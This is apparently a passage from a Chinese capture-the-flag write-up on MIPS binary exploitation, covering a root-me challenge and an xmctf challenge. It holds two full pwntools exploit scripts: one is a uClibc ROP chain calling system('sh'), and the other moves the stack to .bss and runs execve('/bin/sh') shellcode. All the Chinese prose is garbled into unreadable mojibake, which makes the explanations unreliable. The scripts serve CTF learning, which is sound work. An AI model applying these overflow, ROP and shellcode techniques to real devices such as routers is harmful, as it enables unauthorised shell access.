<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/14.jpg" alt></p>
<p>ç¨‹åºå´©æºƒï¼Œç„¶åç¡®å®šåç§»é‡</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/15.jpg" alt></p>
<p>offset=132,æˆ‘ä»¬å†æ¥éªŒè¯ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨cyclicç”Ÿæˆ132ä¸ªå­—ç¬¦å†åŠ ä¸ŠBBBB</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/16.jpg" alt></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿”å›åœ°å€ç¡®å®è¢«è¦†ç›–æˆäº†BBBB</p>
<p>ç¡®å®šäº†è¿”å›åœ°å€ï¼Œè¯¥æ€ä¹ˆåˆ©ç”¨</p>
<p>ç”±äºè¿œç¨‹ç¯å¢ƒæœªå¼€å¯ASLRä¸”ç¨‹åºæœªå¼€å¯PIEï¼Œæ‰€ä»¥libcåŠ è½½åœ°å€æ˜¯ä¸å˜çš„ï¼Œæˆ‘ä»¬æ— éœ€æ³„éœ²libcåœ°å€ï¼Œç›´æ¥vmmapæŸ¥çœ‹libcåŠ è½½åœ°å€å³å¯</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/17.jpg" alt></p>
<p>å¯ä»¥æŸ¥çœ‹åˆ°libcåŸºåœ°å€ä¸º<strong>0x76637000</strong></p>
<p>ç„¶åæˆ‘ä»¬è¦æ„é€ å‡ºsystem(â€˜/bin/shâ€™),æœ‰äº†libcåŸºåœ°å€ï¼Œsystemå’Œbinshå­—ç¬¦ä¸²çš„åœ°å€ä¹ŸçŸ¥é“äº†ï¼Œæ¥ä¸‹æ¥æŸ¥æ‰¾gadgetï¼ŒIDAåŠ è½½libc.so.6ï¼Œä½¿ç”¨<strong>mipsrop.stackfinder()</strong>å‘½ä»¤æŸ¥æ‰¾ç”¨äºæ ˆçš„gadgets</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/18.jpg" alt></p>
<p>æˆ‘ä»¬éœ€è¦æ§åˆ¶$a0ï¼Œç”¨äºå­˜æ”¾binshçš„åœ°å€ï¼Œæˆ‘ä»¬é€‰æ‹©<strong>0x0012BAA4</strong>ä½ç½®å¤„çš„gadgetæ¥æ“ä½œï¼Œå¦‚ä¸‹</p>
<pre class=" language-assembly"><code class="language-assembly">.text:0012BAA4                 move    $t9, $s0
.text:0012BAA8                 jalr    $t9 ; pipe
.text:0012BAAC                 addiu   $a0, $sp, 0x24  # '$'</code></pre>
<p>è¿™ä¸€å¤„gadgetä¼šå°†<strong>$sp+0x24</strong>å¤„çš„å€¼ä½œä¸º<strong>$a0</strong>çš„å€¼ï¼Œæ‰€ä»¥<strong>$sp+0x24</strong>å¤„æˆ‘ä»¬è¦å¡«ä¸Šbinshçš„åœ°å€ï¼Œç„¶åä¼šè·³è½¬åˆ°$s0å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€å¤„ï¼Œæ‰€ä»¥<strong>$s0</strong>æˆ‘ä»¬è¦è®¾ç½®ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œä¸ºäº†æ–¹ä¾¿è¯´æ˜ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªgadgetä¸º<strong>gadget_a0</strong></p>
<p>è¦å®Œæˆ<strong>gadget_a0</strong>ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè®¾ç½®å¥½$s0å¯„å­˜å™¨çš„å€¼ï¼Œuclibcä¸­æœ‰ä¸€ä¸ªç±»ä¼¼äºx86-64æ¶æ„ä¸‹çš„é€šç”¨gadgetï¼Œå¯ä»¥è®¾ç½®æˆ‘ä»¬è¦ç”¨åˆ°çš„ç»å¤§å¤šæ•°çš„å¯„å­˜å™¨çš„å€¼ï¼Œ<strong>ä½äº <code>scandir</code> æˆ–è€… <code>scandir64</code>å°¾éƒ¨</strong>ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<pre class=" language-assembly"><code class="language-assembly">.text:000AE818                 lw      $ra, 0x40+var_4($sp)
.text:000AE81C                 move    $v0, $s6
.text:000AE820                 lw      $s7, 0x40+var_8($sp)
.text:000AE824                 lw      $s6, 0x40+var_C($sp)
.text:000AE828                 lw      $s5, 0x40+var_10($sp)
.text:000AE82C                 lw      $s4, 0x40+var_14($sp)
.text:000AE830                 lw      $s3, 0x40+var_18($sp)
.text:000AE834                 lw      $s2, 0x40+var_1C($sp)
.text:000AE838                 lw      $s1, 0x40+var_20($sp)
.text:000AE83C                 lw      $s0, 0x40+var_24($sp)
.text:000AE840                 jr      $ra
.text:000AE844                 addiu   $sp, 0x40</code></pre>
<p>åˆ©ç”¨è¿™ä¸ªgadgetï¼Œæˆ‘ä»¬å¯ä»¥å°†$s0è®¾ç½®ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œå°†è¿™ä¸ªgadgetæ‰§è¡Œå®Œåçš„è¿”å›å€¼è®¾ç½®ä¸ºgadget_a0çš„åœ°å€ï¼Œå³åœ¨<strong>$sp+0x3c</strong>çš„ä½ç½®å¤„å¡«å…¥gadget_a0çš„åœ°å€ï¼Œç±»ä¼¼çš„æˆ‘ä»¬ç§°è¿™ä¸ªgadgetä¸º<strong>gadget_s0</strong></p>
<p>äºæ˜¯ï¼Œæˆ‘ä»¬æ•´ä¸ªpayloadçš„ç»“æ„å›¾å¦‚ä¸‹</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.png" alt></p>
<p>è¯¦ç»†åœ°è§£é‡Šä¸€ä¸‹è¿™ä¸ªæµç¨‹ï¼Œé¦–å…ˆåç§»é‡132ï¼Œéšåå°†è¿”å›åœ°å€è¦†ç›–ä¸ºgadget_s0ï¼Œç„¶åç”±äºè¿™ä¸€å¥</p>
<pre class=" language-assembly"><code class="language-assembly">lw      $s0, 0x40+var_24($sp)</code></pre>
<p>å°†0x1c($sp)ä½ç½®å¤„çš„å€¼å†™å…¥$s0ï¼Œæ‰€ä»¥$sp+0x1cå¤„æˆ‘ä»¬å¡«å……ä¸ºsystemåœ°å€ï¼Œè€Œç”±äºå½“ç¨‹åºæ‰§è¡Œgadget_s0æ—¶ï¼Œgadget_s0å°±æ˜¯spæ‰€æŒ‡å‘çš„ä½ç½®ï¼Œæ‰€ä»¥ç›´æ¥å¡«å……0x1cä¸ªåƒåœ¾å­—ç¬¦åæ¥ä¸Šsystemåœ°å€å³å¯ï¼Œç”±äºè¿”å›åœ°å€ä¸º</p>
<pre class=" language-assembly"><code class="language-assembly">lw      $ra, 0x40+var_4($sp)</code></pre>
<p>å³ç›¸å¯¹äºè¿”å›åœ°å€ä½ç½®+0x3cå¤„è¦å¡«å……ä¸ºgadget_a0çš„åœ°å€ï¼Œâ€˜Aâ€™*0X1C+system(4å­—èŠ‚)=0x20å­—èŠ‚ï¼Œæ‰€ä»¥åœ¨systemåå†å¡«å……(0x3c-0x20)ä¸ªå­—èŠ‚çš„åƒåœ¾å­—ç¬¦ï¼Œç„¶åå†å¡«å……gadget_a0çš„åœ°å€ï¼Œå†å¡«å……0x24ä¸ªåƒåœ¾å­—èŠ‚ï¼Œæœ€åå†™å…¥binshçš„åœ°å€</p>
<p>ä¸è¿‡è¿™æ ·å­çš„expå†™å®Œä¼šæœ‰ç‚¹é—®é¢˜ï¼Œå‘ç”Ÿåœ¨æ‰§è¡Œsystem(â€œ/bin/shâ€)çš„æ—¶å€™ï¼Œå¦‚ä¸‹</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/21.jpg" alt></p>
<p>ä¹Ÿä¸æƒ³è°ƒè¯•åˆ°åº•æ˜¯å“ªé‡Œå‘ç”Ÿäº†é—®é¢˜ï¼Œä½œä¸ºæ›¿ä»£ï¼Œæˆ‘å°†binshçš„åœ°å€ç›´æ¥æ›¿æ¢ä¸ºsh\x00\x00ï¼Œç„¶åå°±å¯ä»¥æ‰“é€šäº†ï¼Œexpå¦‚ä¸‹</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'big'</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-mips'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'./'</span><span class="token punctuation">,</span> <span class="token string">'./ch64'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#io = process(['qemu-mips', '-L', './', '-g', '1234', './ch64'])</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'lib/libc.so.6'</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token number">0x76637000</span>
system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x00164fac</span>
gadget_a0 <span class="token operator">=</span> <span class="token number">0x0012BAA4</span><span class="token operator">+</span>libc_base
gadget_s0 <span class="token operator">=</span> <span class="token number">0x000AE818</span><span class="token operator">+</span>libc_base

log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'binsh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'gadget_a0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>gadget_a0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'gadget_s0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>gadget_s0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
payload = 'A'*0x40
payload += p32(0x409010)
payload += 'A'*0x40
'''</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">132</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_s0<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1c</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1c</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_a0<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x24</span>
payload <span class="token operator">+=</span> <span class="token string">'sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your passphrase: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your passphrase: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$MyPasswordPoorlySecured!'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/22.jpg" alt></p>
<h2 id="0x3-xmctf-top-mipspwn"><a href="#0x3-xmctf-top-mipspwn" class="headerlink" title="0x3.xmctf.top-mipspwn"></a>0x3.xmctf.top-mipspwn</h2><p>ä¸‹è½½ä¸‹æ¥æœ‰ä¸¤ä¸ªlibcæ–‡ä»¶å’Œä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œchecksecæ£€æŸ¥ä¸€ä¸‹</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/23.jpg" alt></p>
<p>32ä½å°ç«¯åºï¼Œæ— ä¿æŠ¤</p>
<p>fileä¸€ä¸‹</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/24.jpg" alt></p>
<p>é™æ€ç¼–è¯‘ï¼Œæ‰€ä»¥è¿™ä¸ªlibæ–‡ä»¶å¤¹å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p>
<p>åˆ†åˆ«ç”¨ghidraå’ŒIDAåŠ è½½é¢˜ç›®ï¼ŒghidraæŸ¥çœ‹ä¼ªä»£ç </p>
<p>mainå‡½æ•°å’Œæ¼æ´å‡½æ•°åˆ†åˆ«å¦‚ä¸‹</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span>EVP_PKEY_CTX <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token function">init</span><span class="token punctuation">(</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what is your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">vul</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  undefined auStack64 <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"just do it~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>auStack64<span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>c</code></pre>
<p>readè¯»å…¥çš„å­—èŠ‚æ•°å¤§äºç¼“å†²åŒºçš„å¤§å°ï¼Œé€ æˆæº¢å‡º</p>
<p>æ³¨æ„åˆ°å­˜åœ¨ä¸€ä¸ª<strong>backdoor</strong>å‡½æ•°ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"how are you?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>å¹¶æ²¡æœ‰ä»€ä¹ˆğŸ¥šç”¨ï¼Œåªæ˜¯æä¾›äº†ä¸€ä¸ªsystemå‡½æ•°</p>
<p>IDAä½¿ç”¨mipsropæŸ¥æ‰¾ä¸€ä¸‹gadget</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/27.jpg" alt></p>
<p>è™½ç„¶æ˜¯é™æ€ç¼–è¯‘ï¼Œä½†å¯ç”¨çš„gadgetéå¸¸å°‘</p>
<p>è€Œç”¨äºæ ˆçš„gadgetåªæœ‰ä¸€æ¡ï¼Œè¿˜æ˜¯ä¸º$a1èµ‹å€¼</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/28.jpg" alt></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¾—æ¢ä¸ªæ€è·¯ï¼Œgadgetä¸è¶³ï¼Œä¸èƒ½ç”¨ropæ¥getshellï¼Œä½†ç¨‹åºæ²¡æœ‰NXä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾¿é‡‡ç”¨ret2shellcodeæ¥åˆ©ç”¨</p>
<p>é¦–å…ˆç¡®å®šä¸€ä¸‹åç§»é‡å¤§å°</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/29.jpg" alt></p>
<p>glibcpwnä¸­ï¼Œret2shellcodeæœ‰æ—¶ä¼šåˆ©ç”¨readå‡½æ•°å¾€bssç«¯è¯»å…¥shellcodeç„¶åè·³è½¬åˆ°bssæ®µæ‰§è¡Œï¼Œè¿™é¢˜çš„åˆ©ç”¨æ‰‹æ³•ä¹Ÿç±»ä¼¼ï¼Œä¸è¿‡åœ¨è¿™é¢˜ä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½æ‰‹åŠ¨æ„é€ å‡ºreadå‡½æ•°ï¼Œè€Œæ˜¯å€Ÿç”¨vulå‡½æ•°ä¸­çš„readè¯­å¥æ¥æ‰§è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<pre class=" language-assembly"><code class="language-assembly">.text:00400484                 li      $a2, 0xB0
.text:00400488                 addiu   $v0, $fp, 0x58+var_40
.text:0040048C                 move    $a1, $v0
.text:00400490                 move    $a0, $zero
.text:00400494                 la      $v0, read
.text:00400498                 move    $t9, $v0
.text:0040049C                 bal     read</code></pre>
<p>æ³¨æ„åˆ°readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯»å…¥çš„åœ°å€æ¥æºäº$v0,è€Œ$v0åˆæ¥æºäº$fp+0x58-0x40ï¼Œç»§ç»­å¾€ä¸‹çœ‹åˆ°vulå‡½æ•°ç»“æŸçš„è¯­å¥</p>
<pre class=" language-assembly"><code class="language-assembly">.text:004004B0                 lw      $ra, 0x58+var_4($sp)
.text:004004B4                 lw      $fp, 0x58+var_8($sp)
.text:004004B8                 addiu   $sp, 0x58
.text:004004BC                 jr      $ra</code></pre>
<p>vulå‡½æ•°ç»“æŸæ—¶ä¼šè¿˜åŸæ ˆå¸§ï¼Œmainå‡½æ•°çš„$fpçš„å€¼ä¼šå­˜åœ¨$raçš„ä¸Šæ–¹ï¼Œå‡½æ•°ç»“æŸæ—¶ä¼šå°†å…¶å–å‡ºæ”¾å…¥$fpä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶$fpçš„å€¼ï¼Œå†å°†$raè¦†ç›–ä¸ºreadåŠŸèƒ½å¼€å§‹å¤„ï¼Œä¹Ÿå°±æ˜¯0x00400484ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å°†shellcodeå†™å…¥åˆ«çš„ä½ç½®ï¼Œå†å°†è¿”å›åœ°å€è¦†ç›–ä¸ºshellcodeå†™å…¥çš„ä½ç½®ï¼Œè¿”å›åå°±ä¼šæ‰§è¡Œshellcode</p>
<p>å…ˆè´´ä¸Šexp</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span>
<span class="token comment" spellcheck="true">#io = process(['./qemu-mipsel', '-g','1234', './pwn2'])</span>
<span class="token comment" spellcheck="true">#io=remote('xmctf.top',8905)</span>
io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn2'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"what is your name?\n"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'just do it~'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#shellcode = "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>
<span class="token comment" spellcheck="true">#shellcode = "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00"</span>
shellcode<span class="token operator">=</span><span class="token string">"\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh"</span> 
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
read <span class="token operator">=</span> <span class="token number">0x400484</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">56</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">0x58</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">60</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> shellcode

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>ç”±äºåç§»é‡ä¸º60ï¼Œé‚£ä¹ˆç›¸å¯¹äºfpå°±ä¸º56ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯å¾€bssæ®µå†™å…¥shellcodeï¼Œä¸ºé¿å…bsså¼€å¤´å­˜åœ¨æŸäº›å€¼ï¼Œé€‰æ‹©å¾€bss+0x50å¤„å†™å…¥shellcode</p>
<pre class=" language-assembly"><code class="language-assembly">addiu   $v0, $fp, 0x58+var_40</code></pre>
<p>å› ä¸ºæ˜¯å°†<strong>$fp+0x58-0x40</strong>èµ‹ç»™$v0,ä¸ºé¿å…è®¡ç®—ï¼Œæˆ‘ä»¬å°†$fpè®¾ç½®ä¸º<strong>bss+0x50-0x58+0x40</strong>,è¿™æ ·èµ‹ç»™$v0çš„å°±æ˜¯<strong>(bss+0x50-0x58+0x40)+0x58-0x40=bss+0x50</strong>ï¼Œéšåsleep(1),ç­‰å¾…ropæ‰§è¡Œï¼Œæ¥ç€å°±ä¼šæ‰§è¡Œç¬¬äºŒæ¬¡readï¼Œå¾€bss+0x50è¯»ï¼Œå®é™…ä¸Šè¿™å°±æ˜¯ä¸€ä¸ªæ ˆè¿ç§»ï¼Œå°†æ ˆè¿ç§»åˆ°äº†bssæ®µï¼Œè¿™æ¬¡å°±åªéœ€è¦è¦†ç›–$raï¼Œå°†$raä¿®æ”¹ä¸ºshellcodeçš„åœ°å€ã€‚ç¬¬äºŒæ¬¡readä»bss+0x50å¼€å§‹ï¼Œç„¶åå†™å…¥60(0x3c)ä¸ªAï¼Œè¿”å›åœ°å€å å››å­—èŠ‚ï¼ŒåŠ èµ·æ¥å°±æ˜¯0x40ä¸ªå­—èŠ‚ï¼Œè¿”å›åœ°å€ä¹‹åå°±æ˜¯shellcodeï¼Œæ‰€ä»¥å°†è¿”å›åœ°å€ä¿®æ”¹ä¸º<strong>bss+0x50+0x40</strong>å°±å¥½</p>
<p>æ‰§è¡Œæ•ˆæœå¦‚ä¸‹</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/30.jpg" alt></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>â€‹        è¿™ä¸‰é“é¢˜ç›¸ä¿¡åœ¨åšå¤šäº†glibcpwnçš„å¸ˆå‚…ä»¬çœ‹æ¥éƒ½æ˜¯åŸºç¡€é¢˜ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯mipsæ¶æ„ä¸‹çš„æŒ‡ä»¤å’Œå¯„å­˜å™¨çš„åŠŸèƒ½ï¼Œä»¥åŠå¶å­å‡½æ•°å’Œéå¶å­å‡½æ•°çš„ä¸€ç‚¹åŒºåˆ«ã€‚ä¸è¿‡åœ¨è·Ÿç€ã€Šè§£å¯†å®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜æŠ€æœ¯ã€‹è¿™æœ¬ä¹¦è¿›è¡Œä¸€äº›è·¯ç”±å™¨æ¼æ´çš„å¤ç°æ—¶ï¼Œå‘è§‰æŒºå¤šè·¯ç”±å™¨æ¼æ´çš„åˆ©ç”¨éš¾åº¦ä¹Ÿå·®ä¸å¤šæ˜¯è¿™ä¸ªæ°´å¹³(å½“ç„¶ä¹Ÿä¸èƒ½å±€é™äºè¿™ä¸ªéš¾åº¦ï¼Œéš¾é¢˜ä¹Ÿè¿˜æ˜¯æœ‰çš„)ï¼Œè·¯ç”±å™¨ç»å¤§éƒ¨åˆ†æ— aslrï¼Œå›ºä»¶æ— ä¿æŠ¤ï¼Œå›°éš¾ä¹‹å¤„åœ¨äºå‘ç°æ¼æ´ã€‚å½“ç„¶ä¹Ÿå¯èƒ½æ˜¯å› ä¸ºæˆ‘æ¥è§¦çš„å°‘äº†ï¼Œè¿™æœ¬ä¹¦ä¸Šçš„å‡ ä¸ªæ¼æ´ä¹Ÿéƒ½æ˜¯å¥½å‡ å¹´å‰çš„äº†ï¼Œç°åœ¨çš„æƒ…å†µä¹Ÿåº”è¯¥æœ‰æ‰€å˜åŒ–ã€‚</p>
<p>â€‹        æœ€åï¼Œå¸Œæœ›æœ¬ç¯‡æ–‡ç« èƒ½ä¸ºåƒæˆ‘ä¸€æ ·åˆšå…¥é—¨çš„å¸ˆå‚…ä»¬æä¾›ä¸€ç‚¹å¸®åŠ©ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<ul>
<li><a href="https://www.root-me.org/en/Challenges/App-System/" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/App-System/</a></li>
<li><a href="https://www.cnblogs.com/hac425/p/9416864.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416864.html</a></li>
<li><a href="https://blog.csdn.net/seaaseesa/article/details/105281585" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105281585</a></li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
